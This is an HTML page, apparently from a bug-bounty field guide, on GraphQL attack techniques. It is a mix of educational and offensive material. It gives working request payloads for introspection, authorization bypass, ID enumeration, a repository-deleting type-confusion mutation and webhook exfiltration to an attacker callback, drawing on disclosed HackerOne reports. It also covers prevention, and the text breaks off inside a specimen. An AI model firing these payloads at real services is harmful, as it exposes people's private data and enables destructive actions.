@@ -1,0 +1,727 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GraphQL · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Attack surface</b><span class="sep">/</span><b>GraphQL</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="on" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Attack surface</div>
+      <h1>GraphQL</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>42</b></span><a class="chip lab" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>GraphQL API</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>GraphQL exposes a single typed endpoint (<code>/graphql</code>) over which the client asks for <strong>exactly the fields it wants</strong>, in whatever nesting it likes. That flexibility is the vulnerability: authorization is enforced per <strong>resolver</strong>, not per <strong>object graph</strong>, so the same private record is usually reachable through more than one path — a <code>nodes</code> shortcut instead of <code>edges { node }</code>, an alias, a nested connection, the Relay <code>node(id:)</code> global-id interface, a <code>where</code> filter, or the websocket transport.</p>
+<p>Treat GraphQL as an <strong>authorization-testing surface first</strong> and an injection surface second. The dominant bug is not RCE — it is <em>the guarded path is protected, the alternate path is not</em>. Every returned object is an invitation to request one more sub-field, one more traversal, one more type. The self-describing schema (introspection) hands you the whole map for free.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Find the endpoint(s).</strong> <code>/graphql</code>, <code>/api/graphql</code>, <code>/admin/api/{version}/graphql</code>, <code>/admin/internal/web/graphql/core</code>. Fuzz <code>/graphql</code> on <strong>every subdomain</strong>, not just the main app — internal tooling often ships an unauthenticated instance.</li><li><strong>Confirm it speaks GraphQL and dump the schema</strong> via introspection (below). If HTTP introspection is off, retry over the <strong>websocket</strong> and via <strong>field-suggestion</strong> errors.</li><li><strong>Inventory the two things that produce most bugs:</strong> by-identifier queries (<code>userByDodId</code>, <code>node(id:)</code>, <code>location(code:)</code>) and every field name that smells sensitive (<code>email</code>, <code>pin</code>, <code>ssn</code>, <code>token</code>, <code>otp_backup_codes</code>, <code>total_count</code>).</li><li><strong>Request the same object through every traversal</strong> — <code>nodes</code> vs <code>edges</code>, aliases, nested parents, <code>node(id:)</code>, aggregations. Diff what each path returns.</li><li><strong>BOLA every by-id query</strong> — swap your identifier for a victim's. <strong>BFLA every mutation</strong> — swap your <code>id:</code> argument for a higher-value GID.</li><li><strong>Escalate the leak</strong> to PII harvest, privilege escalation, or a REST-side pivot.</li></ol>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>The single most common mistake is sending the query <strong>without</strong> <code>Content-Type: application/json</code>. The endpoint replies <code>"query string not present"</code> and looks dead — supplying the header revives it (#419883).</div></div>
+<h2 class="sec" id="introspection-schema-recovery"><span class="tick">§</span>Introspection &amp; schema recovery</h2>
+<p>Introspection is GraphQL's built-in self-documentation. If it is on, one query returns every type, field, argument, and mutation.</p>
+<div class="pre" data-lang="http"># Always application/json. A missing header hides a live endpoint.
+POST /graphql HTTP/1.1
+Host: TARGET
+Content-Type: application/json
+
+{"query":"query{__schema{queryType{name} mutationType{name} types{name kind fields{name}}}}"}</div>
+<details class="fold"><summary>Full introspection query (fields, args, input types)</summary><div class="body"><div class="pre" data-lang="js">// Maps every by-id query and mutation input — paste as the "query" value
+query IntrospectionQuery {
+  __schema {
+    queryType { name }
+    mutationType { name }
+    types {
+      name kind
+      fields { name args { name type { name kind ofType { name } } } }
+      inputFields { name type { name kind ofType { name } } }
+    }
+  }
+}</div></div></details>
+<p>When introspection is disabled, two fallbacks recover the schema anyway:</p>
+<div class="pre" data-lang="js">// 1. Websocket start message — auth/introspection hardening is usually HTTP-only (#862835)
+{"type":"connection_init","payload":{}}
+{"type":"start","id":"1","payload":{"query":"query IntrospectionQuery{__schema{types{name kind fields{name}}}}"}}</div>
+<div class="pre" data-lang="http"># 2. Field-suggestion errors leak names one at a time ("Did you mean 'email'?")
+POST /graphql HTTP/1.1
+Content-Type: application/json
+
+{"query":"query{user{emial}}"}</div>
+<div class="callout note"><span class="ico">● NOTE</span><div>Introspection off is not introspection safe. <code>clairvoyance</code> reconstructs the whole schema purely from field-suggestion errors, and the websocket <code>start</code> message bypasses HTTP-layer controls entirely (#862835). Always retest on the subscription transport.</div></div>
+<h2 class="sec" id="authorization-bypass-traversals"><span class="tick">§</span>Authorization-bypass traversals</h2>
+<p>The core move: <strong>authz is per-resolver, so reach the same object by a different resolver.</strong> Find which traversal your target forgot to guard.</p>
+<h3 class="sub" id="nodes-vs-edges"><code>nodes</code> vs <code>edges</code></h3>
+<p>Modern GraphQL libraries auto-generate a <code>nodes</code> helper alongside <code>edges { node }</code>. It is a <strong>separate resolver</strong> and frequently skips the attribute-level authorization scopes that <code>edges</code> enforces (#489146). Request every connection both ways and diff the fields that come back.</p>
+<div class="pre" data-lang="http">POST /graphql HTTP/1.1
+Content-Type: application/json
+
+# nodes is a distinct, often-unguarded path to the same records
+{"query":"{ users { nodes { email account_recovery_phone_number otp_backup_codes totp_enabled vpn_credentials { name } } } }"}</div>
+<h3 class="sub" id="field-over-fetch">Field over-fetch</h3>
+<p>Object-level authz frequently passes while field-level authz is missing — you own the object, but it exposes fields you shouldn't read. Enumerate <strong>every</strong> field of user/staff/team objects: <code>pin</code>, <code>secret</code>, <code>phone</code>, <code>ssn</code>, <code>token</code>, <code>total_count</code>.</p>
+<div class="pre" data-lang="http">POST /admin/api/unversioned/graphql HTTP/1.1
+Content-Type: application/json
+X-Shopify-Access-Token: LOW_PRIV_XAUTH_TOKEN
+
+# staffMembers.pin leaks a Manager PIN to a stripped-down user (#1091303)
+{"query":"{ shop{ staffMembers(first:100){ edges{ node{ name pin isShopOwner } } } } }"}</div>
+<h3 class="sub" id="bola-on-by-identifier-queries">BOLA on by-identifier queries</h3>
+<p>Any query that takes an identifier (<code>dodId</code>, <code>guid</code>, <code>code</code>, numeric id) is a BOLA candidate: authz is enforced at the endpoint, not per object. Swap your identifier for a victim's — identifiers leak from adjacent systems (address books, your own record's relations).</p>
+<div class="pre" data-lang="http">POST /api/graphql HTTP/1.1
+Content-Type: application/json
+
+# Same authenticated session, someone else's records (#2954320)
+{"query":"query{ findLdapPersonByDodId(dodId:\"VICTIM_DODID\"){ givenName sn ssn rank mail uic status } }"}</div>
+<h3 class="sub" id="relay-node-id-enumeration">Relay <code>node(id:)</code> enumeration</h3>
+<p>The Relay <code>node(id:)</code> interface accepts a base64 <code>gid://app/Type/&lt;PK&gt;</code>. Two problems: it is often a <strong>separate, unguarded resolver</strong> for objects the primary query protects (#978143, #781150, #1618347), and it defeats UUIDs — if an object also has a sequential PK, decode the gid, walk the PK, re-encode, and read the "secret" UUID back (#447930).</p>
+<div class="pre" data-lang="http">POST /graphql HTTP/1.1
+Content-Type: application/json
+
+# base64("gid://hackerone/EmbeddedSubmissionForm/9") — increment the PK, read back the UUID
+{"query":"{ node(id:\"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\"){ ... on EmbeddedSubmissionForm{ uuid team{ handle policy } } } }"}</div>
+<h3 class="sub" id="global-id-type-confusion">Global-ID type confusion</h3>
+<p>Global IDs are opaque but <strong>polymorphic</strong>. Any resolver that calls <code>object_from_id</code>/<code>GlobalID.find</code> <strong>without asserting the expected type</strong> lets you smuggle a higher-value object into a permission check written for a weaker one — a confused deputy. On every mutation, keep the operation but swap the <code>id:</code> for a GID of a more valuable type.</p>
+<div class="pre" data-lang="js">// Annotation-delete authz is lenient; run it against a Project GID -&gt; repo deleted (#960244)
+mutation {
+  deleteAnnotation(input: {id: "gid://Gitlab/Project/VICTIM_PROJECT_ID"}) {
+    clientMutationId
+  }
+}</div>
+<h3 class="sub" id="nested-sub-connections">Nested sub-connections</h3>
+<p>Even when the parent object is authorized, its child connections may not be. Expand every sub-connection on a <code>User</code>/<code>Team</code> node and hunt for private metadata leaking through an unguarded child — including objects where <code>report:null</code> but the metadata fields are still populated (#871749).</p>
+<div class="pre" data-lang="http">POST /graphql HTTP/1.1
+Content-Type: application/json
+
+# report_retests leaks asset/severity/weakness for never-disclosed reports (#871749)
+{"query":"{ user(username:\"VICTIM\"){ report_retests{ nodes{ report{_id} asset_name asset_type severity_rating weakness_name } } } }"}</div>
+<h3 class="sub" id="filters-aggregations-as-authz-bypass">Filters &amp; aggregations as authz bypass</h3>
+<p>Row-level authorization guards <em>which rows you get back</em> — but <code>where</code>/<code>_or</code>/<code>_and</code> filters (#645299, #1276992) let you enumerate objects the row filter should hide, and <code>aggs</code>/<code>terms</code> aggregations (#1838329) return private field <strong>values</strong> even when the underlying rows are blocked. The aggregation never returns the row, so the row guard never fires.</p>
+<div class="pre" data-lang="http">POST /graphql HTTP/1.1
+Content-Type: application/json
+
+# aggs returns aggregated private field values (e.g. private-program handles) without ever returning a guarded row
+{"query":"{ opportunities_search(query:{}, aggs:{results:{terms:{field:\"handle\"}}}){ aggs } }"}</div>
+<h3 class="sub" id="mutation-response-echo-webhook-exfil">Mutation response echo &amp; webhook exfil</h3>
+<p>Mutations leak two ways. Invite/collaborate flows that accept a <strong>username</strong> often resolve it to the account and <strong>echo the private email</strong> in the response before the invite is accepted (#2032716). And webhook-subscription mutations that don't check per-topic authorization become an exfil pipe: subscribe a sensitive topic to your own callback (#1350095).</p>
+<div class="pre" data-lang="js">// Zero-permission staff subscribes a sensitive topic to COLLAB -&gt; receives the data (#1350095)
+{"operationName":"webhookSubscriptionCreate",
+ "variables":{"topic":"BULK_OPERATIONS_FINISH","webhookSubscription":{"callbackUrl":"https://COLLAB/"}},
+ "query":"mutation webhookSubscriptionCreate($topic: WebhookSubscriptionTopic!, $webhookSubscription: WebhookSubscriptionInput!){ webhookSubscriptionCreate(topic:$topic, webhookSubscription:$webhookSubscription){ webhookSubscription{ id } } }"}</div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>A leaked field or a schema dump on its own is often triaged as low. <strong>Chain it.</strong> Introspection → by-id BOLA → org-wide PII (#2954320); a <code>nodes</code> over-fetch of <code>otp_backup_codes</code>/<code>vpn_credentials</code> → account takeover (#489146); a <code>StaffMember.pin</code> leak → real-world privesc on the register (#1091303). Report the impact, not the primitive.</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Introspection "disabled" (HTTP)</td><td>send <code>IntrospectionQuery</code> over the websocket <code>start</code> message</td><td>#862835</td></tr><tr><td>Endpoint looks "dead"</td><td>supply <code>Content-Type: application/json</code> — <code>"query string not present"</code> hides a live endpoint</td><td>#419883</td></tr><tr><td>Field-level authz on <code>edges{node}</code></td><td>request the same connection via the auto-generated <code>nodes { }</code> resolver</td><td>#489146</td></tr><tr><td>Object-level authz on the primary query</td><td>reach the object via the Relay <code>node(id:)</code> global-id interface instead</td><td>#978143, #781150, #1618347</td></tr><tr><td>UUID used as access control</td><td>object also has a sequential PK; enumerate the PK via <code>node(id:)</code>, read the UUID back</td><td>#447930</td></tr><tr><td>Permission check on a weak type</td><td>pass a high-value GID to an untyped <code>object_from_id</code> (confused deputy)</td><td>#960244</td></tr><tr><td>Row-level authz</td><td>pull the values through <code>aggs</code>/<code>terms</code> aggregation instead of rows</td><td>#1838329</td></tr><tr><td>Row-level authz</td><td>enumerate hidden objects via <code>_or</code>/<code>_and</code>/<code>where</code> filters</td><td>#645299, #1276992</td></tr><tr><td>Server-side mutation/rate limit</td><td>fan the mutation out across GraphQL <strong>aliases</strong> in one request</td><td>#2166697</td></tr><tr><td>Parallel-authz gap (REST blocks it)</td><td>the GraphQL namespace query returns data the REST endpoint refuses</td><td>#614355</td></tr><tr><td>Internal REST re-encoding</td><td>URL-encoded <code>?</code>/<code>&amp;</code>/trailing <code>%26</code> inside the GID inject path/query, defeat the <code>.json</code> suffix</td><td>#800231</td></tr></tbody></table></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>GraphQL is a hub in multi-bug chains, not a dead end:</p>
+<ul><li><strong>Introspection → by-id BOLA → org-wide PII.</strong> Map the schema, enumerate by-id queries, swap identifiers — SSN/clearance/evaluations across a whole org (#2954320).</li><li><strong>REST write + GraphQL read.</strong> Attach a foreign user to an object you own (award a bounty to their <code>user_id</code> via the REST API), then read that object's privileged sub-fields back to steal their email (#2382120).</li><li><strong>Low-priv token → over-fetch → real-world privesc.</strong> An over-scoped <code>xauth</code> token reads <code>StaffMember.pin</code> → Manager PIN → escalate on the physical POS (#1091303).</li><li><strong><code>node(id:)</code> global-id → internal REST param injection.</strong> URL-encoded <code>?</code>/<code>&amp;</code> inside an opaque GID break out of an internal ActiveResource path into a filter/index call; RTT becomes a boolean oracle even when every response is a 500 (#800231) — a GraphQL-to-SSRF pivot.</li><li><strong>Type confusion → destructive action.</strong> An annotation-delete permission applied to a <code>Project</code> GID deletes the repository (#960244).</li><li><strong>Recursive introspection → DoS</strong> when there is no depth limit (#2048725).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Authorize at the object/field layer, not the endpoint.</strong> Every resolver must run the check — <code>nodes</code> <em>and</em> <code>edges</code>, <code>node(id:)</code>, aggregations, filters, nested connections — so no alternate path reaches data the primary path blocks (#489146, #871749, #1838329).</li><li><strong>Type-check global IDs.</strong> <code>object_from_id</code>/<code>GlobalID.find</code> must assert the resolved object is the expected type <em>before</em> the permission check, closing confused-deputy substitutions (#960244).</li><li><strong>Disable introspection and field suggestions in production on <em>all</em> transports</strong> (HTTP and websocket) — otherwise the schema is recoverable (#862835, #2954320).</li><li><strong>Don't rely on UUID opacity.</strong> If an object is reachable by sequential PK through <code>node(id:)</code>, the UUID is not access control (#447930).</li><li><strong>Enforce depth, complexity, and alias limits</strong> to stop recursive-introspection DoS and alias-batching abuse (#2048725, #2166697); re-encode any GID passed to an internal service (#800231).</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite</strong> with <strong>InQL</strong> / <strong>GraphQL Raider</strong> — schema parsing, query building, batching.</li><li><strong>clairvoyance</strong> / <strong>graphql-cop</strong> — reconstruct the schema from field-suggestion errors when introspection is off.</li><li><strong>graphw00f</strong> — fingerprint the GraphQL engine (implementation-specific quirks).</li><li><strong>wsrepl</strong> / browser DevTools — drive the websocket subscription transport (#862835).</li><li><strong>Amass / httpx</strong> — sweep <code>/graphql</code> across every subdomain (#419883).</li><li>Any base64 tool — decode and enumerate Relay global IDs (#447930, #800231).</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>42</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-489146" style="--sv:var(--sev-crit)" data-sev="4" data-votes="1032" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL `nodes` connection field bypasses field-level authz</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#489146</b> · security · awarded · 1032 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A migration to graphql-ruby's class-based API auto-added a `nodes` helper on every connection. Unlike `edges { node }`, `nodes` skipped attribute-level authorization scopes, serializing sensitive User fields to any caller.</p>
+<h4>Method</h4><ol><li>Enumerate connection types in the schema (introspection or known queries)</li><li>For each connection request `nodes { &lt;sensitive fields&gt; }` instead of `edges { node { ... } }`</li><li>Diff which fields return under nodes vs edges to find the unguarded path</li></ol>
+<div class="pre">{ users() { nodes { email account_recovery_phone_number otp_backup_codes facebook_user_id totp_enabled vpn_credentials { name } } } }</div>
+<p class="insight"><b>Insight —</b> On GraphQL, request the SAME data through every available traversal (nodes vs edges, aliases, nested parents). Authorization is often enforced per-resolver, so an alternate field reaching the same object leaks what the guarded path blocks.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/489146" target="_blank" rel="noopener">hackerone.com/reports/489146</a></span><a class="src" href="#report-489146" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1618347" style="--sv:var(--sev-crit)" data-sev="4" data-votes="285" data-bounty="25000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauthenticated GraphQL node(id) discloses private-program assets by gid enumeration</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1618347</b> · security · 25000 · 285 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The generic Relay node(id:) resolver returned PolicyPageAssetGroup objects (private program names/scope) with no authorization check; enumerating the numeric portion of the gid leaked private program data to unauthenticated users.</p>
+<h4>Method</h4><ol><li>Take a known gid type: gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/{id}</li><li>Query node(id) requesting the inline fragment fields</li><li>Enumerate {id} to walk private programs</li></ol>
+<div class="pre">{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}</div>
+<p class="insight"><b>Insight —</b> The Relay/global node() interface is a universal IDOR surface: it resolves many types through one field that frequently skips per-type auth. Enumerate gids (raw or base64) to pull private objects.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1618347" target="_blank" rel="noopener">hackerone.com/reports/1618347</a></span><a class="src" href="#report-1618347" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2382120" style="--sv:var(--sev-crit)" data-sev="4" data-votes="99" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL over-fetch of private email/counts via privileged sub-fields</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#2382120</b> · security · awarded · 99 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Chain <b>API bounty creation -&gt; target user attached to your progr</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">GraphQL nodes exposed privileged sub-fields (invitations{email}, reporter{email}, whitelisted_hackers{total_count}) that were not authorization-checked at field level; by creating a bounty to a target user_id via the Customer REST API then querying BountiesHistoryQuery, the target's private email was returned.</p>
+<h4>Method</h4><ol><li>Create an API token (report manager role) for a sandbox program</li><li>Copy any target user's id from their profile</li><li>POST a bounty to that recipient_id via the Customer API (/v1/programs/{id}/bounties)</li><li>Run BountiesHistoryQuery for your sandbox handle and read node.report.reporter.email / invitations.email from the response</li></ol>
+<div class="pre">POST https://api.hackerone.com/v1/programs/{id}/bounties
+{"data":{"type":"bounty","attributes":{"recipient_id":"&lt;TARGET_USER_ID&gt;","amount":51,"reference":"x","title":"x","currency":"USD","severity_rating":"high"}}}
+
+# then GraphQL:
+query BountiesHistoryQuery($handle:String!,$pageSize:Int!,$cursor:String){team(handle:$handle){bounties(first:$pageSize,after:$cursor){edges{node{awarded_user{username} invitations{email token} report{reporter{email id username}}}}}}}</div>
+<p class="insight"><b>Insight —</b> On GraphQL, request every sub-field of every returned node (email, token, counts) - field-level authz is often missing even when object-level is enforced. Chain a state-changing API call (award/invite) to attach a target object to your own tenant, then read its privileged fields back.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2382120" target="_blank" rel="noopener">hackerone.com/reports/2382120</a></span><a class="src" href="#report-2382120" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/graphql" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2954320" style="--sv:var(--sev-crit)" data-sev="4" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL introspection + missing object-level authz -&gt; mass PII extraction</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#2954320</b> · deptofdefense · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>graphql</b></span><span>Chain <b>introspection -&gt; enumerate by-id queries -&gt; BOLA on ea</b></span><span>Tag <b>graphql</b></span></div>
